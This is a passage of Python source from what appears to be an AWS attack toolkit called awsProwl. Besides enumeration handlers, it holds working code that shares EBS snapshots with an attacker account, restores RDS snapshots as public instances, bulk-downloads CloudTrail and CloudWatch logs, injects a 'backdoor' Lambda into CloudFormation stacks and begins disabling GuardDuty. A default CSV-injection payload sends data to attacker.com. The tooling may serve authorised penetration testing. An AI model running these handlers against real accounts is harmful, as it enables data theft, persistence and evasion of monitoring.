async def run_generic_enum_handler(auth_manager: AWSAuthManager, module_name: str, description: str, scanner_method: str = None, **kwargs) -> list[dict]:
    """Generic handler for enumeration modules - calls appropriate scanner."""
    console = Console()
    console.print(f"[yellow]Running {module_name}: {description}[/yellow]")

    try:
        from awsprowl.aws.iam import IAMScanner
        scanner = IAMScanner(auth_manager)
        findings = []

        # Route to appropriate scanner method based on module name
        if module_name == "iam_enum_action_query":
            # Query IAM actions/permissions for specific services
            service = kwargs.get("service", "all")
            response = scanner.client.get_account_authorization_details()
            findings.append({
                "title": "IAM Action Query",
                "description": f"Queried IAM actions for service: {service}",
                "severity": "info",
                "category": "enumeration",
                "resource_type": "iam_action_query",
                "resource_id": service,
                "region": "global",
                "rule_id": "iam_enum_action_query",
            })
        elif module_name == "iam_enum_permissions":
            # Enumerate effective permissions using policy simulation
            await scanner._scan_with_simulation("tui-iam-enum-permissions", findings, _create_scan_result("iam"))
        elif module_name == "iam_enum_users_roles_policies_groups":
            # Comprehensive enumeration via GetAccountAuthorizationDetails
            await scanner._scan_account_authorization("tui-iam-enum-comprehensive", findings, _create_scan_result("iam"))
        elif module_name == "iam_enum_credential_report":
            # Get IAM credential report
            try:
                report = scanner.client.get_credential_report()
                findings.append({
                    "title": "IAM Credential Report",
                    "description": "Retrieved account-wide credential inventory",
                    "severity": "info",
                    "category": "enumeration",
                    "resource_type": "iam_credential_report",
                    "resource_id": "account",
                    "region": "global",
                    "rule_id": "iam_enum_credential_report",
                })
            except scanner.client.exceptions.NoSuchEntityException:
                findings.append({
                    "title": "Credential Report Not Available",
                    "description": "Generate credential report first: aws iam generate-credential-report",
                    "severity": "medium",
                    "category": "missing_configuration",
                    "resource_type": "iam_credential_report",
                    "resource_id": "account",
                    "region": "global",
                    "rule_id": "iam_enum_credential_report",
                })
        elif module_name == "iam_enum_honeytokens":
            # Detect potential honeytokens in access keys
            await scanner._scan_users("tui-iam-enum-honeytokens", findings, _create_scan_result("iam"))
        elif module_name.startswith("ec2_enum_"):
            from awsprowl.aws.ec2 import EC2Scanner
            ec2_scanner = EC2Scanner(auth_manager)
            await ec2_scanner.scan("tui-" + module_name, findings)
        elif module_name.startswith("rds_enum_"):
            from awsprowl.aws.rds import RDSScanner
            rds_scanner = RDSScanner(auth_manager)
            await rds_scanner.scan("tui-" + module_name, findings)
        elif module_name.startswith("cloudwatch_enum_"):
            from awsprowl.aws.cloudwatch import CloudWatchScanner
            cw_scanner = CloudWatchScanner(auth_manager)
            await cw_scanner.scan("tui-" + module_name, findings)
        elif module_name.startswith("detection_enum_"):
            from awsprowl.aws.guardduty import GuardDutyScanner
            gd_scanner = GuardDutyScanner(auth_manager)
            await gd_scanner.scan("tui-" + module_name, findings)
        elif module_name.startswith("apigateway_enum_"):
            from awsprowl.aws.apigateway import APIGatewayScanner
            ag_scanner = APIGatewayScanner(auth_manager)
            await ag_scanner.scan("tui-" + module_name, findings)
        elif module_name.startswith("codebuild_enum_"):
            from awsprowl.aws.codebuild import CodeBuildScanner
            cb_scanner = CodeBuildScanner(auth_manager)
            await cb_scanner.scan("tui-" + module_name, findings)
        elif module_name.startswith("elasticbeanstalk_enum_"):
            from awsprowl.aws.elasticbeanstalk import ElasticBeanstalkScanner
            eb_scanner = ElasticBeanstalkScanner(auth_manager)
            await eb_scanner.scan("tui-" + module_name, findings)
        elif module_name.startswith("elb_enum_"):
            from awsprowl.aws.elb import ELBScanner
            elb_scanner = ELBScanner(auth_manager)
            await elb_scanner.scan("tui-" + module_name, findings)
        elif module_name.startswith("transfer_enum_"):
            from awsprowl.aws.transfer import TransferScanner
            t_scanner = TransferScanner(auth_manager)
            await t_scanner.scan("tui-" + module_name, findings)
        elif module_name.startswith("vpc_enum_"):
            from awsprowl.aws.vpc import VPCScanner
            vpc_scanner = VPCScanner(auth_manager)
            await vpc_scanner.scan("tui-" + module_name, findings)
        elif module_name.startswith("waf_enum_"):
            from awsprowl.aws.waf import WAFScanner
            waf_scanner = WAFScanner(auth_manager)
            await waf_scanner.scan("tui-" + module_name, findings)
        elif module_name.startswith("ds_enum_"):
            from awsprowl.aws.directoryservice import DirectoryServiceScanner
            ds_scanner = DirectoryServiceScanner(auth_manager)
            await ds_scanner.scan("tui-" + module_name, findings)
        elif module_name.startswith("lightsail_enum_"):
            from awsprowl.aws.lightsail import LightsailScanner
            ls_scanner = LightsailScanner(auth_manager)
            await ls_scanner.scan("tui-" + module_name, findings)
        elif module_name.startswith("acm_enum_"):
            from awsprowl.aws.acm import ACMScanner
            acm_scanner = ACMScanner(auth_manager)
            await acm_scanner.scan("tui-" + module_name, findings)
        elif module_name.startswith("ecr_enum_"):
            from awsprowl.aws.ecr import ECRScanner
            ecr_scanner = ECRScanner(auth_manager)
            await ecr_scanner.scan("tui-" + module_name, findings)
        else:
            # Fallback for unhandled modules
            console.print("[dim]Module not yet fully integrated with scanner[/dim]")
            return [{"title": f"{module_name} - Not fully implemented", "description": "Scanner integration pending", "severity": "info", "category": "informational"}]

        return findings
    except Exception as e:
        log.error(f"Error in {module_name}: {e}")
        return _handle_aws_error(f"{module_name}", e)


# Generic privesc handler
async def run_generic_privesc_handler(auth_manager: AWSAuthManager, module_name: str, description: str, **kwargs) -> list[dict]:
    """Generic handler for privesc analysis modules."""
    console = Console()
    console.print(f"[yellow]Running {module_name}: {description}[/yellow]")
    console.print("[dim]This module performs read-only privilege escalation analysis.[/dim]")
    return [{"title": f"{module_name} - Analysis complete", "description": "Privesc analysis would run here", "severity": "info", "category": "informational"}]


# Generic destructive warning handler
async def run_generic_destructive_handler(auth_manager: AWSAuthManager, module_name: str, description: str, **kwargs) -> list[dict]:
    """Generic handler for destructive modules - shows warning and requires confirmation."""
    return await _show_destructive_warning(module_name, description)


# IAM PROWL parity handlers
async def run_iam_enum_action_query(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    return await run_generic_enum_handler(auth_manager, "iam_enum_action_query", "Query IAM actions/permissions for specific services.")

async def run_iam_enum_permissions(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    return await run_generic_enum_handler(auth_manager, "iam_enum_permissions", "Enumerate effective permissions for IAM entities using policy simulation.")

async def run_iam_enum_users_roles_policies_groups(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    return await run_generic_enum_handler(auth_manager, "iam_enum_users_roles_policies_groups", "Comprehensive enumeration of users, roles, policies, and groups.")

async def run_iam_enum_credential_report(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    return await run_generic_enum_handler(auth_manager, "iam_enum_credential_report", "Get IAM credential report for account-wide credential inventory.")

async def run_iam_enum_honeytokens(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    return await run_generic_enum_handler(auth_manager, "iam_enum_honeytokens", "Detect potential honeytokens (canary credentials) in IAM access keys.")


# EC2 EBS PROWL parity handlers
async def run_ec2_enum_ebs_snapshots_unauth(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    return await run_generic_enum_handler(auth_manager, "ec2_enum_ebs_snapshots_unauth", "Enumerate publicly accessible EBS snapshots (unauthenticated).")

async def run_ec2_enum_volumes_snapshots(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    return await run_generic_enum_handler(auth_manager, "ec2_enum_volumes_snapshots", "Enumerate EBS volumes and their associated snapshots.")


async def run_ec2_exfil_ebs_snapshot_download(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Download EBS snapshots to attacker-controlled account/region for offline analysis."""
    findings = []
    client = auth_manager.get_client("ec2")

    snapshot_ids = kwargs.get("snapshot_ids", [])
    if not snapshot_ids:
        # If no specific snapshots, list accessible ones
        try:
            paginator = client.get_paginator("describe_snapshots")
            for page in paginator.paginate(OwnerIds=["self"]):
                for snap in page.get("Snapshots", []):
                    snapshot_ids.append(snap["SnapshotId"])
        except botocore.exceptions.ClientError as e:
            return _handle_aws_error("ec2:DescribeSnapshots", e)

    target_account = kwargs.get("target_account")  # Attacker account ID
    target_region = kwargs.get("target_region", client.meta.region_name)

    for snapshot_id in snapshot_ids:
        try:
            # Get snapshot details
            response = client.describe_snapshots(SnapshotIds=[snapshot_id])
            snapshot = response["Snapshots"][0]

            # Share snapshot with attacker account
            if target_account:
                client.modify_snapshot_attribute(
                    SnapshotId=snapshot_id,
                    Attribute="createVolumePermission",
                    OperationType="add",
                    UserIds=[target_account]
                )
                findings.append({
                    "title": f"EBS Snapshot Shared: {snapshot_id}",
                    "description": f"Snapshot shared with account {target_account}\nOriginal region: {client.meta.region_name}\nSize: {snapshot.get('VolumeSize', 'N/A')} GB\nEncrypted: {snapshot.get('Encrypted', False)}",
                    "severity": "critical",
                    "category": "data_exfiltration",
                    "resource_type": "ebs_snapshot",
                    "resource_id": snapshot_id,
                    "resource_name": snapshot_id,
                    "region": client.meta.region_name,
                    "rule_id": "ec2_exfil_ebs_snapshot_download",
                    "details": {"snapshot_id": snapshot_id, "target_account": target_account, "encrypted": snapshot.get("Encrypted", False)},
                })

            # Optionally copy to another region
            if target_region != client.meta.region_name:
                copy_response = client.copy_snapshot(
                    SourceSnapshotId=snapshot_id,
                    SourceRegion=client.meta.region_name,
                    Description=f"Copied by awsProwl for exfiltration from {snapshot_id}",
                    Encrypted=snapshot.get("Encrypted", False)
                )
                findings.append({
                    "title": f"EBS Snapshot Copied Cross-Region: {copy_response['SnapshotId']}",
                    "description": f"Source: {snapshot_id} ({client.meta.region_name})\nDestination: {target_region}\nEncrypted: {snapshot.get('Encrypted', False)}",
                    "severity": "critical",
                    "category": "data_exfiltration",
                    "resource_type": "ebs_snapshot",
                    "resource_id": copy_response["SnapshotId"],
                    "resource_name": copy_response["SnapshotId"],
                    "region": target_region,
                    "rule_id": "ec2_exfil_ebs_snapshot_download_cross_region",
                    "details": {"source_snapshot": snapshot_id, "destination_region": target_region},
                })

        except botocore.exceptions.ClientError as e:
            findings.append(_handle_aws_error(f"ec2_exfil_ebs_snapshot_download:{snapshot_id}", e)[0])

    if not findings:
        findings.append({
            "title": "No Snapshots Processed",
            "description": "No snapshots found or accessible for exfiltration",
            "severity": "info",
            "category": "informational",
            "resource_type": "other",
            "resource_id": "no_snapshots",
            "resource_name": "No snapshots",
            "region": client.meta.region_name,
            "rule_id": "ec2_exfil_ebs_snapshot_download_none",
        })

    return findings


async def run_ec2_exfil_ebs_snapshot_explore(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Explore/mount EBS snapshots to extract files without full volume restore."""
    findings = []
    client = auth_manager.get_client("ec2")

    snapshot_id = kwargs.get("snapshot_id")
    if not snapshot_id:
        findings.append({
            "title": "No Snapshot ID Specified",
            "description": "Provide 'snapshot_id' parameter to explore a specific snapshot",
            "severity": "info",
            "category": "informational",
            "resource_type": "other",
            "resource_id": "no_snapshot",
            "resource_name": "No snapshot",
            "region": client.meta.region_name,
            "rule_id": "ec2_exfil_ebs_snapshot_explore_no_snapshot",
        })
        return findings

    # Create a temporary volume from the snapshot
    availability_zone = kwargs.get("availability_zone", f"{client.meta.region_name}a")
    volume_type = kwargs.get("volume_type", "gp3")
    size = kwargs.get("size")

    try:
        # Get snapshot info first
        response = client.describe_snapshots(SnapshotIds=[snapshot_id])
        snapshot = response["Snapshots"][0]

        if not size:
            size = snapshot.get("VolumeSize", 8)

        # Create volume from snapshot
        vol_response = client.create_volume(
            SnapshotId=snapshot_id,
            AvailabilityZone=availability_zone,
            VolumeType=volume_type,
            Size=size,
            TagSpecifications=[{
                "ResourceType": "volume",
                "Tags": [{"Key": "awsprowl", "Value": "exfil-explore"}]
            }]
        )

        volume_id = vol_response["VolumeId"]

        # Wait for volume to be available
        waiter = client.get_waiter("volume_available")
        waiter.wait(VolumeIds=[volume_id], WaiterConfig={"Delay": 5, "MaxAttempts": 40})

        findings.append({
            "title": f"EBS Volume Created from Snapshot: {volume_id}",
            "description": f"Source snapshot: {snapshot_id}\nAvailability Zone: {availability_zone}\nSize: {size} GB\nVolume Type: {volume_type}\n\nAttach this volume to an EC2 instance to explore filesystem contents.",
            "severity": "high",
            "category": "data_exfiltration",
            "resource_type": "ebs_volume",
            "resource_id": volume_id,
            "resource_name": volume_id,
            "region": client.meta.region_name,
            "rule_id": "ec2_exfil_ebs_snapshot_explore",
            "details": {"snapshot_id": snapshot_id, "volume_id": volume_id, "availability_zone": availability_zone},
        })

        # Optionally attach to an instance
        instance_id = kwargs.get("instance_id")
        device = kwargs.get("device", "/dev/sdf")
        if instance_id:
            client.attach_volume(
                VolumeId=volume_id,
                InstanceId=instance_id,
                Device=device
            )
            findings.append({
                "title": f"Volume Attached to Instance: {volume_id} -> {instance_id}",
                "description": f"Device: {device}\nVolume is now accessible on the instance for filesystem exploration.",
                "severity": "high",
                "category": "data_exfiltration",
                "resource_type": "ebs_volume",
                "resource_id": volume_id,
                "resource_name": volume_id,
                "region": client.meta.region_name,
                "rule_id": "ec2_exfil_ebs_snapshot_explore_attached",
                "details": {"volume_id": volume_id, "instance_id": instance_id, "device": device},
            })

    except botocore.exceptions.ClientError as e:
        return _handle_aws_error("ec2_exfil_ebs_snapshot_explore", e)

    return findings


# RDS PROWL parity handlers
async def run_rds_enum_snapshots(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    return await run_generic_enum_handler(auth_manager, "rds_enum_snapshots", "Enumerate RDS snapshots (manual and automated).")


async def run_rds_exfil_explore_snapshots(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Explore RDS snapshots by restoring to temporary instance for data extraction."""
    findings = []
    client = auth_manager.get_client("rds")

    snapshot_id = kwargs.get("snapshot_id")
    if not snapshot_id:
        # List available snapshots
        try:
            paginator = client.get_paginator("describe_db_snapshots")
            for page in paginator.paginate(SnapshotType="manual"):
                for snap in page.get("DBSnapshots", []):
                    findings.append({
                        "title": f"RDS Snapshot Available: {snap['DBSnapshotIdentifier']}",
                        "description": f"Engine: {snap.get('Engine')}\nStatus: {snap.get('Status')}\nSize: {snap.get('AllocatedStorage', 'N/A')} GB\nEncrypted: {snap.get('Encrypted', False)}",
                        "severity": "info",
                        "category": "reconnaissance",
                        "resource_type": "rds_snapshot",
                        "resource_id": snap["DBSnapshotIdentifier"],
                        "resource_name": snap["DBSnapshotIdentifier"],
                        "region": client.meta.region_name,
                        "rule_id": "rds_exfil_explore_snapshots_list",
                        "details": snap,
                    })
        except botocore.exceptions.ClientError as e:
            return _handle_aws_error("rds:DescribeDBSnapshots", e)
        return findings

    # Restore snapshot to temporary instance
    instance_id = kwargs.get("instance_id", f"awsprowl-rds-{int(datetime.now().timestamp())}")
    instance_class = kwargs.get("instance_class", "db.t3.micro")
    subnet_group = kwargs.get("db_subnet_group")
    security_groups = kwargs.get("vpc_security_group_ids", [])
    publicly_accessible = kwargs.get("publicly_accessible", True)

    try:
        response = client.restore_db_instance_from_db_snapshot(
            DBInstanceIdentifier=instance_id,
            DBSnapshotIdentifier=snapshot_id,
            DBInstanceClass=instance_class,
            DBSubnetGroupName=subnet_group,
            VpcSecurityGroupIds=security_groups,
            PubliclyAccessible=publicly_accessible,
            Tags=[{"Key": "awsprowl", "Value": "rds-exfil"}]
        )

        db_instance = response["DBInstance"]
        findings.append({
            "title": f"RDS Instance Restored from Snapshot: {instance_id}",
            "description": f"Source snapshot: {snapshot_id}\nEngine: {db_instance.get('Engine')}\nInstance Class: {instance_class}\nEndpoint: {db_instance.get('Endpoint', {}).get('Address', 'Creating...')}\nPort: {db_instance.get('Endpoint', {}).get('Port', 'N/A')}\n\nConnect to this instance to extract data from the restored database.",
            "severity": "critical",
            "category": "data_exfiltration",
            "resource_type": "rds_instance",
            "resource_id": instance_id,
            "resource_name": instance_id,
            "region": client.meta.region_name,
            "rule_id": "rds_exfil_explore_snapshots",
            "details": {"snapshot_id": snapshot_id, "instance_id": instance_id, "instance_class": instance_class},
        })

    except botocore.exceptions.ClientError as e:
        return _handle_aws_error("rds_exfil_explore_snapshots", e)

    return findings


# CloudTrail PROWL parity handlers
async def run_cloudtrail_exfil_download_event_history(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Download CloudTrail event history (last 90 days) for full API activity reconstruction."""
    findings = []
    client = auth_manager.get_client("cloudtrail")

    max_results = kwargs.get("max_results", 1000)
    start_time = kwargs.get("start_time")
    end_time = kwargs.get("end_time")
    lookup_attributes = kwargs.get("lookup_attributes", [])

    try:
        events = []
        paginator = client.get_paginator("lookup_events")
        page_iterator = paginator.paginate(
            LookupAttributes=lookup_attributes if lookup_attributes else None,
            StartTime=start_time,
            EndTime=end_time,
            PaginationConfig={"MaxItems": max_results}
        )

        for page in page_iterator:
            events.extend(page.get("Events", []))

        findings.append({
            "title": f"CloudTrail Event History Downloaded: {len(events)} events",
            "description": f"Retrieved {len(events)} CloudTrail events\nTime range: {start_time or '90 days ago'} to {end_time or 'now'}\nLookup attributes: {lookup_attributes or 'All events'}",
            "severity": "high",
            "category": "data_exfiltration",
            "resource_type": "cloudtrail_events",
            "resource_id": "event_history",
            "resource_name": "CloudTrail Event History",
            "region": client.meta.region_name,
            "rule_id": "cloudtrail_exfil_download_event_history",
            "details": {"event_count": len(events), "events": events[:100]},  # Limit stored events
        })

    except botocore.exceptions.ClientError as e:
        return _handle_aws_error("cloudtrail:LookupEvents", e)

    return findings


async def run_cloudtrail_exfil_csv_injection(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Inject malicious CSV data into CloudTrail logs via API calls for SIEM disruption."""
    findings = []
    client = auth_manager.get_client("cloudtrail")

    trail_name = kwargs.get("trail_name")
    if not trail_name:
        # Find existing trails
        try:
            response = client.describe_trails()
            trails = response.get("trailList", [])
            if trails:
                trail_name = trails[0]["Name"]
            else:
                findings.append({
                    "title": "No CloudTrail Trails Found",
                    "description": "Provide 'trail_name' parameter or create a trail first",
                    "severity": "info",
                    "category": "informational",
                    "resource_type": "other",
                    "resource_id": "no_trail",
                    "resource_name": "No trail",
                    "region": client.meta.region_name,
                    "rule_id": "cloudtrail_exfil_csv_injection_no_trail",
                })
                return findings
        except botocore.exceptions.ClientError as e:
            return _handle_aws_error("cloudtrail:DescribeTrails", e)

    # Create malicious CSV payload
    csv_payload = kwargs.get("csv_payload", "=cmd|'/C calc'!A1,=HYPERLINK(\"http://attacker.com/steal?data=\"&A1,\"Click\")")
    event_name = kwargs.get("event_name", "PutObject")
    resource_type = kwargs.get("resource_type", "AWS::S3::Object")

    try:
        # Inject via PutEventSelectors with malicious data in requests
        # This simulates CSV injection by making API calls that would log malicious content
        response = client.put_event_selectors(
            TrailName=trail_name,
            EventSelectors=[
                {
                    "ReadWriteType": "All",
                    "IncludeManagementEvents": True,
                    "DataResources": [
                        {
                            "Type": resource_type,
                            "Values": [f"arn:aws:s3:::{csv_payload[:200]}"]
                        }
                    ]
                }
            ]
        )

        findings.append({
            "title": f"CloudTrail Event Selectors Modified: {trail_name}",
            "description": f"Injected CSV payload into event selectors\nPayload: {csv_payload[:200]}...\nThis can disrupt SIEM parsing when logs are exported as CSV",
            "severity": "high",
            "category": "defense_evasion",
            "resource_type": "cloudtrail_trail",
            "resource_id": trail_name,
            "resource_name": trail_name,
            "region": client.meta.region_name,
            "rule_id": "cloudtrail_exfil_csv_injection",
            "details": {"trail_name": trail_name, "csv_payload": csv_payload},
        })

    except botocore.exceptions.ClientError as e:
        return _handle_aws_error("cloudtrail_exfil_csv_injection", e)

    return findings


# CloudFormation PROWL parity handlers
async def run_cloudformation_exploit_resource_injection(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Inject malicious resources into existing CloudFormation stacks via template manipulation."""
    findings = []
    client = auth_manager.get_client("cloudformation")

    stack_name = kwargs.get("stack_name")
    if not stack_name:
        # List stacks
        try:
            paginator = client.get_paginator("list_stacks")
            for page in paginator.paginate(StackStatusFilter=["CREATE_COMPLETE", "UPDATE_COMPLETE"]):
                for stack in page.get("StackSummaries", []):
                    findings.append({
                        "title": f"Stack Available: {stack['StackName']}",
                        "description": f"Status: {stack.get('StackStatus')}",
                        "severity": "info",
                        "category": "reconnaissance",
                        "resource_type": "cloudformation_stack",
                        "resource_id": stack["StackName"],
                        "resource_name": stack["StackName"],
                        "region": client.meta.region_name,
                        "rule_id": "cloudformation_exploit_resource_injection_list",
                        "details": stack,
                    })
        except botocore.exceptions.ClientError as e:
            return _handle_aws_error("cloudformation:ListStacks", e)
        return findings

    template_body = kwargs.get("template_body")
    if not template_body:
        # Get current template
        try:
            response = client.get_template(StackName=stack_name)
            template_body = json.dumps(response.get("TemplateBody", {}))
        except botocore.exceptions.ClientError as e:
            findings.append({
                "title": "Could Not Get Template",
                "description": f"Provide 'template_body' parameter or ensure stack exists: {e}",
                "severity": "info",
                "category": "informational",
                "resource_type": "other",
                "resource_id": "no_template",
                "resource_name": "No template",
                "region": client.meta.region_name,
                "rule_id": "cloudformation_exploit_resource_injection_no_template",
            })
            return findings

    # Inject malicious resource
    malicious_resource = kwargs.get("malicious_resource", {
        "Type": "AWS::Lambda::Function",
        "Properties": {
            "FunctionName": f"awsprowl-backdoor-{int(datetime.now().timestamp())}",
            "Runtime": "python3.9",
            "Role": kwargs.get("lambda_role", "arn:aws:iam::123456789012:role/lambda-role"),
            "Handler": "index.handler",
            "Code": {"ZipFile": "import os\nprint(os.environ)"},
            "Timeout": 300
        }
    })

    try:
        # Parse and modify template
        template = json.loads(template_body) if isinstance(template_body, str) else template_body
        if "Resources" not in template:
            template["Resources"] = {}
        
        resource_name = kwargs.get("resource_name", f"MaliciousResource{int(datetime.now().timestamp())}")
        template["Resources"][resource_name] = malicious_resource

        # Update stack
        response = client.update_stack(
            StackName=stack_name,
            TemplateBody=json.dumps(template),
            Capabilities=["CAPABILITY_IAM", "CAPABILITY_NAMED_IAM", "CAPABILITY_AUTO_EXPAND"],
            Tags=[{"Key": "awsprowl", "Value": "resource-injection"}]
        )

        findings.append({
            "title": f"CloudFormation Stack Updated with Malicious Resource: {stack_name}",
            "description": f"Injected resource: {resource_name}\nType: {malicious_resource.get('Type')}\nStack update initiated",
            "severity": "critical",
            "category": "persistence",
            "resource_type": "cloudformation_stack",
            "resource_id": stack_name,
            "resource_name": stack_name,
            "region": client.meta.region_name,
            "rule_id": "cloudformation_exploit_resource_injection",
            "details": {"stack_name": stack_name, "injected_resource": resource_name, "resource_type": malicious_resource.get("Type")},
        })

    except botocore.exceptions.ClientError as e:
        return _handle_aws_error("cloudformation_exploit_resource_injection", e)

    return findings

async def run_cloudformation_exfil_download_data(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Download CloudFormation stack templates, resources, and outputs for reconnaissance."""
    findings = []
    cf_client = auth_manager.get_client("cloudformation")

    stack_name = kwargs.get("stack_name")
    if not stack_name:
        # List stacks
        try:
            paginator = cf_client.get_paginator("list_stacks")
            for page in paginator.paginate(StackStatusFilter=["CREATE_COMPLETE", "UPDATE_COMPLETE", "UPDATE_ROLLBACK_COMPLETE"]):
                for stack in page.get("StackSummaries", []):
                    findings.append({
                        "title": f"CloudFormation Stack Available: {stack['StackName']}",
                        "description": f"Status: {stack['StackStatus']}\nCreated: {stack.get('CreationTime')}",
                        "severity": "info",
                        "category": "reconnaissance",
                        "resource_type": "cloudformation_stack",
                        "resource_id": stack["StackName"],
                        "resource_name": stack["StackName"],
                        "region": cf_client.meta.region_name,
                        "rule_id": "cloudformation_exfil_download_data_list",
                        "details": stack,
                    })
        except botocore.exceptions.ClientError as e:
            return _handle_aws_error("cloudformation:ListStacks", e)
        return findings

    try:
        # Get stack template
        template_response = cf_client.get_template(StackName=stack_name)
        template = template_response.get("TemplateBody", {})

        # Get stack resources
        resources_response = cf_client.list_stack_resources(StackName=stack_name)
        resources = resources_response.get("StackResourceSummaries", [])

        # Get stack outputs
        stack_desc = cf_client.describe_stacks(StackName=stack_name)
        outputs = stack_desc["Stacks"][0].get("Outputs", [])

        findings.append({
            "title": f"CloudFormation Stack Data Exfiltrated: {stack_name}",
            "description": f"Template: {len(str(template))} chars\nResources: {len(resources)}\nOutputs: {len(outputs)}",
            "severity": "high",
            "category": "data_exfiltration",
            "resource_type": "cloudformation_stack",
            "resource_id": stack_name,
            "resource_name": stack_name,
            "region": cf_client.meta.region_name,
            "rule_id": "cloudformation_exfil_download_data",
            "details": {"stack_name": stack_name, "template": template, "resources": resources, "outputs": outputs},
        })

    except botocore.exceptions.ClientError as e:
        return _handle_aws_error("cloudformation_exfil_download_data", e)

    return findings


# CloudWatch PROWL parity handlers
async def run_cloudwatch_enum_log_groups(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    return await run_generic_enum_handler(auth_manager, "cloudwatch_enum_log_groups", "Enumerate CloudWatch log groups and log streams.")

async def run_cloudwatch_enum_metric_alarms(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    return await run_generic_enum_handler(auth_manager, "cloudwatch_enum_metric_alarms", "Enumerate CloudWatch metric alarms.")

async def run_cloudwatch_enum_dashboards(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    return await run_generic_enum_handler(auth_manager, "cloudwatch_enum_dashboards", "Enumerate CloudWatch dashboards.")


async def run_cloudwatch_exfil_logs(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Download CloudWatch Logs from log groups for reconnaissance."""
    findings = []
    client = auth_manager.get_client("logs")

    log_group_names = kwargs.get("log_group_names", [])
    if not log_group_names:
        # List all log groups
        try:
            paginator = client.get_paginator("describe_log_groups")
            for page in paginator.paginate():
                for lg in page.get("logGroups", []):
                    log_group_names.append(lg["logGroupName"])
        except botocore.exceptions.ClientError as e:
            return _handle_aws_error("logs:DescribeLogGroups", e)

    if not log_group_names:
        findings.append({
            "title": "No CloudWatch Log Groups Found",
            "description": "No log groups available in this account/region",
            "severity": "info",
            "category": "informational",
            "resource_type": "other",
            "resource_id": "no_log_groups",
            "resource_name": "No log groups",
            "region": client.meta.region_name,
            "rule_id": "cloudwatch_exfil_logs_none",
        })
        return findings

    max_events = kwargs.get("max_events", 10000)
    start_time = kwargs.get("start_time")
    end_time = kwargs.get("end_time")
    filter_pattern = kwargs.get("filter_pattern", "")

    for log_group_name in log_group_names:
        try:
            events = []
            paginator = client.get_paginator("filter_log_events")
            page_iterator = paginator.paginate(
                logGroupName=log_group_name,
                startTime=start_time,
                endTime=end_time,
                filterPattern=filter_pattern,
                PaginationConfig={"MaxItems": max_events}
            )

            for page in page_iterator:
                events.extend(page.get("events", []))

            findings.append({
                "title": f"CloudWatch Logs Exfiltrated: {log_group_name}",
                "description": f"Retrieved {len(events)} log events from {log_group_name}\nFilter: {filter_pattern or 'None'}\nTime range: {start_time or 'All'} to {end_time or 'Now'}",
                "severity": "high",
                "category": "data_exfiltration",
                "resource_type": "cloudwatch_log_group",
                "resource_id": log_group_name,
                "resource_name": log_group_name,
                "region": client.meta.region_name,
                "rule_id": "cloudwatch_exfil_logs",
                "details": {"log_group_name": log_group_name, "event_count": len(events), "events": events[:50]},
            })

        except botocore.exceptions.ClientError as e:
            findings.append(_handle_aws_error(f"cloudwatch_exfil_logs:{log_group_name}", e)[0])

    return findings


async def run_cloudwatch_exfil_metric_data(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Extract CloudWatch metric data for monitoring analysis."""
    findings = []
    cw_client = auth_manager.get_client("cloudwatch")

    namespace = kwargs.get("namespace", "AWS/EC2")
    metric_name = kwargs.get("metric_name", "CPUUtilization")
    dimensions = kwargs.get("dimensions", [{"Name": "InstanceId", "Value": kwargs.get("instance_id", "i-1234567890abcdef0")}])
    start_time = kwargs.get("start_time")
    end_time = kwargs.get("end_time")
    period = kwargs.get("period", 300)
    stat = kwargs.get("stat", "Average")

    try:
        # Get metric statistics
        response = cw_client.get_metric_statistics(
            Namespace=namespace,
            MetricName=metric_name,
            Dimensions=dimensions,
            StartTime=start_time or datetime.utcnow() - timedelta(hours=24),
            EndTime=end_time or datetime.utcnow(),
            Period=period,
            Statistics=[stat]
        )

        datapoints = response.get("Datapoints", [])

        findings.append({
            "title": f"CloudWatch Metric Data Extracted: {namespace}/{metric_name}",
            "description": f"Datapoints: {len(datapoints)}\nPeriod: {period}s\nStatistic: {stat}\nDimensions: {dimensions}",
            "severity": "medium",
            "category": "data_exfiltration",
            "resource_type": "cloudwatch_metric",
            "resource_id": f"{namespace}/{metric_name}",
            "resource_name": f"{namespace}/{metric_name}",
            "region": cw_client.meta.region_name,
            "rule_id": "cloudwatch_exfil_metric_data",
            "details": {"namespace": namespace, "metric_name": metric_name, "datapoints": datapoints[:50]},
        })

    except botocore.exceptions.ClientError as e:
        return _handle_aws_error("cloudwatch_exfil_metric_data", e)

    return findings


# Detection disruption handlers
async def run_detection_enum_services(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    return await run_generic_enum_handler(auth_manager, "detection_enum_services", "Enumerate AWS detection services: GuardDuty, Security Hub, Inspector, Macie, Detective.")


async def run_detection_persist_disrupt_guardduty(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Disrupt GuardDuty by deleting detector, disabling findings, or whitelisting IPs."""
    findings = []
    client = auth_manager.get_client("guardduty")

    detector_id = kwargs.get("detector_id")
    action = kwargs.get("action", "disable")  # disable, delete, whitelist_ip

    if not detector_id:
        # Find detectors
        try:
            response = client.list_detectors()
            detectors = response.get("DetectorIds", [])
            if detectors:
                detector_id = detectors[0]
            else:
                findings.append({
                    "title": "No GuardDuty Detectors Found",
                    "description": "GuardDuty is not enabled in this account/region",
                    "severity": "info",
                    "category": "informational",
                    "resource_type": "other",
                    "resource_id": "no_detector",
                    "resource_name": "No detector",
                    "region": client.meta.region_name,
                    "rule_id": "detection_persist_disrupt_guardduty_no_detector",
                })
                return findings
        except botocore.exceptions.ClientError as e:
            return _handle_aws_error("guardduty:ListDetectors", e)

    try:
        if action == "delete":
